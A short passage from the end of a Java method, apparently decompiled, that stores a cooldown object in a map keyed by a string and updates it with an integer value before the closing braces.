        this.cooldowns.put(paramString, localCooldown1);
      }
      localCooldown1.update(paramInt);
    }
  }
}
